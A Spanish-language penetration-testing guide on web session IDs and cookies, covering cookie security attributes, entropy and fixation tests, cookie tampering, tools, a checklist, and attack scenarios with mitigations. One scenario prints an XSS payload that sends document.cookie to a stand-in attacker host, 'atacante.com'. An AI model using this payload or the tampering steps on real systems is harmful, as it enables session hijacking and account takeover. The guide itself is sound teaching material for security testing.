
# Session ID y Cookies

La gestión de sesiones es uno de los pilares fundamentales de la seguridad en aplicaciones web. Sin un mecanismo robusto, la autenticación pierde todo su sentido. Esta sección aborda en profundidad los Session IDs, las cookies y cómo testear su seguridad en una prueba de penetración profesional.

***

## <mark style="color:$primary;">¿Qué es una sesión web?</mark>

HTTP es un protocolo **sin estado** (*stateless*): cada petición es independiente y el servidor no recuerda quién eres de una petición a la siguiente. Para solucionar esto, las aplicaciones web implementan **mecanismos de sesión** que permiten mantener información (como la identidad del usuario) entre múltiples peticiones.

El flujo típico es:

1. El usuario se autentica con sus credenciales.
2. El servidor crea una sesión y genera un identificador único (*Session ID*).
3. El servidor envía el Session ID al cliente, normalmente mediante una cookie.
4. El cliente incluye ese Session ID en cada petición posterior.
5. El servidor identifica al usuario a partir del Session ID.

***

## <mark style="color:$primary;">Cookies: el soporte físico del Session ID</mark>

Una **cookie** es un pequeño fragmento de texto que el servidor envía al navegador y que éste devuelve automáticamente en cada petición al mismo dominio. Las cookies son el mecanismo más común para transportar Session IDs.

**Atributos de seguridad de las cookies**

Cuando el servidor crea una cookie, puede incluir atributos que modifican su comportamiento. **Testear estos atributos es una de las primeras tareas en cualquier auditoría de sesiones**.

<table data-header-hidden><thead><tr><th width="175.66668701171875"></th><th width="292.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Atributo</td><td>Propósito</td><td>Valor de prueba</td></tr><tr><td><code>Secure</code></td><td>La cookie solo se envía por conexiones HTTPS (nunca por HTTP plano).</td><td><strong>Crítico.</strong> Sin <code>Secure</code>, la cookie puede ser robada en redes WiFi públicas.</td></tr><tr><td><code>HttpOnly</code></td><td>La cookie no es accesible desde JavaScript (solo se envía en peticiones HTTP).</td><td><strong>Crítico.</strong> Sin <code>HttpOnly</code>, un XSS puede robar la cookie fácilmente.</td></tr><tr><td><code>SameSite</code></td><td>Controla si la cookie se envía en peticiones cross-site. Valores: <code>Strict</code>, <code>Lax</code>, <code>None</code>.</td><td><strong>Importante.</strong> Previene CSRF en gran medida.</td></tr><tr><td><code>Domain</code></td><td>Especifica qué dominios pueden recibir la cookie.</td><td>Restringir al mínimo necesario (ej. <code>ejemplo.com</code> en lugar de <code>.ejemplo.com</code>).</td></tr><tr><td><code>Path</code></td><td>Restringe la cookie a una ruta específica del dominio.</td><td>Útil para limitar exposición, aunque no es una barrera de seguridad fuerte.</td></tr><tr><td><code>Expires</code> / <code>Max-Age</code></td><td>Define la duración de la cookie (persistente vs. de sesión).</td><td>Las sesiones no deberían durar indefinidamente.</td></tr><tr><td><code>__Host-</code> prefijo</td><td>La cookie solo se acepta si: tiene <code>Secure</code>, viene del mismo host (sin Domain), y está en la ruta <code>/</code>.</td><td>Protección adicional contra fijación y robo.</td></tr><tr><td><code>__Secure-</code> prefijo</td><td>La cookie solo se acepta si tiene <code>Secure</code>.</td><td>Protección adicional para cookies sensibles.</td></tr></tbody></table>

### **¿Cómo testear los atributos de una cookie?**

1. **Intercepta la respuesta** del servidor que establece la cookie (normalmente después de un login exitoso).
2. **Inspecciona la cabecera `Set-Cookie`**:

```bash
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

3. **Verifica**:
   * ¿Falta `Secure`? La cookie viajaría por HTTP.
   * ¿Falta `HttpOnly`? Potencial robo mediante XSS.
   * ¿`SameSite=None` sin `Secure`? Navegadores modernos la rechazarían directamente.
4. **Intenta modificar manualmente** la cookie (con el `Cookie Editor` de Burp o `document.cookie` en consola si no hay `HttpOnly`) para ver si el servidor la acepta modificada sin validación adicional.

***

### Session ID: propiedades de un buen identificador

Un Session ID debe ser **impredecible, único y resistente a ataques**. Las siguientes propiedades son esenciales para la seguridad:

1. **Aleatoriedad criptográfica** – Generado con un PRNG seguro (ej. `java.security.SecureRandom` en Java, `secrets.token_hex()` en Python, `crypto.randomBytes()` en Node.js).
2. **Longitud suficiente** – Mínimo 128 bits (32 caracteres hex) para resistir fuerza bruta. Lo común hoy son 256 bits o más.
3. **Sin información incrustada** – No debe contener el nombre de usuario, el rol, la fecha de expiración o cualquier dato predecible (ej. JWT sin firma o datos en claro).
4. **Rotación post-autenticación** – El Session ID debe cambiar después de un login exitoso para prevenir fijación de sesión.
5. **Caducidad definida** – Las sesiones inactivas deben expirar (15-30 minutos para alta seguridad) y también debe existir una expiración absoluta (ej. 8 horas independientemente de la actividad).

### **Atributos del Session ID en la cookie**

Además de los atributos de cookie generales, el Session ID en sí mismo debe incluir ciertos metadatos de seguridad:

<table data-header-hidden><thead><tr><th width="279.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Atributo implícito</td><td>Propósito</td></tr><tr><td><code>Expiration</code></td><td>La sesión no es eterna. El servidor debe validar la expiración en cada petición.</td></tr><tr><td><code>Last activity</code></td><td>Permite una expiración por inactividad.</td></tr><tr><td><code>IP address binding</code> (opcional)</td><td>Vincular sesión a la IP del cliente para evitar secuestro (aunque puede romper la UX en redes móviles).</td></tr><tr><td><code>User-Agent binding</code> (opcional)</td><td>Vincular sesión al navegador; menos restrictivo que la IP, añade una capa de defensa.</td></tr></tbody></table>

***

## <mark style="color:$primary;">Testing de Session IDs y Cookies</mark>

A continuación, se presentan las pruebas fundamentales que debes realizar sobre cualquier mecanismo de sesión.

### **1. Análisis de aleatoriedad (entropía)**

**Objetivo:** Determinar si los Session IDs son predecibles.

**Método manual:**

* Captura múltiples Session IDs consecutivos (al menos 20-30).
* Obsérvalos visualmente: ¿Incrementan? ¿Siguen un patrón horario? ¿Contienen texto legible?

**Método con herramientas:**

* **Burp Sequencer:** Herramienta específica para análisis de entropía.
  1. Envía la petición que genera la cookie al **Repeater**.
  2. Haz clic derecho → **Send to Sequencer**.
  3. En la pestaña **Sequencer**, configura el número de muestras (recomendado: 10,000 o más).
  4. Inicia la captura (`Start live capture`).
  5. Una vez completado, Burp mostrará un análisis estadístico con una estimación de la entropía (bits). Una puntuación baja indica un generador débil.

### **2. Pruebas de fijación de sesión (Session Fixation)**

**Objetivo:** Verificar si un atacante puede forzar a un usuario a usar un Session ID conocido.

**Procedimiento:**

1. Obtén un Session ID válido sin estar autenticado (accede a cualquier página pública que asigne una cookie).
2. Inicia sesión en una ventana de incógnito con el mismo Session ID (inyectándolo manualmente con un editor de cookies o Burp).
3. Si tras autenticarte el Session ID **no cambia**, la aplicación es vulnerable a fijación de sesión.

**Variante avanzada:** Algunas aplicaciones solo cambian el ID si el usuario accede a una ruta específica. Prueba diferentes flujos de login (login con red social, login con 2FA, recuperación de contraseña).

### **3. Manipulación de cookies (Cookie tampering)**

**Objetivo:** Intentar modificar valores en la cookie para escalar privilegios.

**Caso común:** Cookies en texto claro o ligeramente ofuscadas que contienen el rol del usuario.

**Ejemplo:**

```bash
Cookie: user=john; role=user; id=1243
```

Intenta cambiar `role=user` a `role=admin`. Si el servidor acepta esta modificación, es una vulnerabilidad crítica.

**Codificaciones comunes a testear:**

* Base64 (`admin` → `YWRtaW4=`)
* URL encoding (`admin` → `admin%00`)
* Hexadecimal (`admin` → `61646d696e`)

### **4. Reutilización de sesión después de logout**

**Objetivo:** Verificar que el Session ID se invalida en el servidor tras el cierre de sesión.

**Procedimiento:**

1. Inicia sesión y captura el Session ID.
2. Cierra sesión (logout).
3. Intenta acceder a un endpoint autenticado usando el Session ID antiguo.
4. Si la petición tiene éxito, las sesiones no se invalidan correctamente.

### **5. Sesiones persistentes inadecuadas**

**Objetivo:** Detectar sesiones que nunca expiran.

**Procedimiento:**

1. Inicia sesión y captura el Session ID.
2. Espera el tiempo documentado de expiración (normalmente en la política de seguridad o descúbrelo por fuerza bruta temporal: espera 8 horas, luego 24, luego 7 días).
3. Reutiliza el Session ID.
4. Si sigue funcionando después de una semana, es un fallo de seguridad (especialmente en aplicaciones bancarias o sanitarias).

### **6. Sesión concurrente (Multiple sessions)**

**Objetivo:** Entender la política de sesiones de la aplicación.

**Pruebas:**

* Inicia sesión desde dos navegadores diferentes. ¿Funcionan ambas?
* ¿Hay un límite de sesiones concurrentes por usuario?
* ¿Se notifica al usuario sobre nuevos inicios de sesión?

**Hallazgo típico:** La aplicación permite sesiones ilimitadas sin ningún aviso. No es una vulnerabilidad en sí misma, pero reduce la capacidad de detectar cuentas comprometidas.

***

## <mark style="color:$primary;">Herramientas específicas para testing de sesiones</mark>

<table data-header-hidden><thead><tr><th width="318.92596435546875"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Uso principal</td></tr><tr><td><strong>Burp Sequencer</strong></td><td>Análisis de entropía y aleatoriedad de tokens.</td></tr><tr><td><strong>Burp Repeater</strong></td><td>Reenvío de peticiones con cookies modificadas.</td></tr><tr><td><strong>Burp Intruder</strong></td><td>Fuerza bruta de Session IDs (en entornos controlados y autorizados).</td></tr><tr><td><strong>EditThisCookie</strong> (extensión navegador)</td><td>Manipulación rápida de cookies desde el navegador.</td></tr><tr><td><strong>Cookie-Editor</strong> (alternativa)</td><td>Similar, con exportación/importación de cookies.</td></tr><tr><td><strong>HackBar</strong></td><td>Inyección de cabeceras personalizadas incluyendo <code>Cookie</code>.</td></tr><tr><td><strong>Logger++</strong> (extensión Burp)</td><td>Monitoreo de cookies a lo largo del tiempo en múltiples peticiones.</td></tr><tr><td><strong>Auth Analyzer</strong> (extensión Burp)</td><td>Automatiza pruebas de autenticación y sesiones.</td></tr></tbody></table>

***

## <mark style="color:$primary;">Checklist de pruebas de sesión</mark>

<table data-header-hidden><thead><tr><th width="63.8148193359375"></th><th width="549.6298828125"></th><th></th></tr></thead><tbody><tr><td>#</td><td>Prueba</td><td>Severidad</td></tr><tr><td>1</td><td>¿La cookie tiene <code>Secure</code> flag?</td><td>Crítica</td></tr><tr><td>2</td><td>¿La cookie tiene <code>HttpOnly</code> flag?</td><td>Alta</td></tr><tr><td>3</td><td>¿Se usa <code>SameSite=Lax</code> o <code>Strict</code>?</td><td>Media</td></tr><tr><td>4</td><td>¿El Session ID es aleatorio (alta entropía)?</td><td>Crítica</td></tr><tr><td>5</td><td>¿El Session ID cambia después del login?</td><td>Alta</td></tr><tr><td>6</td><td>¿La sesión expira por inactividad?</td><td>Media</td></tr><tr><td>7</td><td>¿La sesión tiene expiración absoluta?</td><td>Media</td></tr><tr><td>8</td><td>¿El logout invalida la sesión en el servidor?</td><td>Alta</td></tr><tr><td>9</td><td>¿Se puede secuestrar la sesión con un XSS? (por falta de <code>HttpOnly</code>)</td><td>Crítica</td></tr><tr><td>10</td><td>¿Se puede fijar la sesión (Session Fixation)?</td><td>Alta</td></tr><tr><td>11</td><td>¿La cookie contiene información del usuario en texto claro?</td><td>Media</td></tr><tr><td>12</td><td>¿La cookie es accesible desde subdominios por <code>Domain</code> demasiado amplio?</td><td>Baja-Media</td></tr></tbody></table>

***

## <mark style="color:$primary;">Escenarios de ataque reales</mark>

#### **Escenario 1: Robo de sesión mediante XSS sin HttpOnly**

La aplicación no usa `HttpOnly`. Un atacante inyecta:

```html
<script>
fetch('https://atacante.com/steal?cookie=' + document.cookie);
</script>
```

La cookie viaja al servidor del atacante. Este la usa para hacerse pasar por la víctima.

**Mitigación:** `HttpOnly` flag en todas las cookies de sesión.

#### **Escenario 2: Fijación de sesión en aplicación bancaria**

Un atacante envía un enlace malicioso:

```bash
https://banco.com/login?sessionId=ABCD1234
```

La víctima inicia sesión. El servidor no regenera el ID. El atacante, que conoce `ABCD1234`, usa esa cookie y accede a la cuenta.

**Mitigación:** Regenerar Session ID siempre después de autenticación exitosa.

#### **Escenario 3: Cookie predecible (entropía baja)**

Los Session IDs son simplemente `timestamp + username` en Base64.

```python
def generate_session(user):
    return base64.b64encode(f"{int(time.time())}:{user}".encode())
```

Un atacante genera IDs para fechas pasadas y toma el control de cuentas antiguas.

**Mitigación:** Usar generadores criptográficamente seguros (`secrets.token_urlsafe(32)` en Python, `crypto.randomBytes(32)` en Node.js).

***

## <mark style="color:$primary;">Referencias y recursos oficiales</mark>

* [OWASP Testing Guide 4.2: Session Management Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README)
* [OWASP Cheat Sheet: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
* [PortSwigger Web Security Academy: Session Management](https://portswigger.net/web-security/session-management)
* [RFC 6265 – HTTP State Management Mechanism (cookies)](https://datatracker.ietf.org/doc/html/rfc6265)
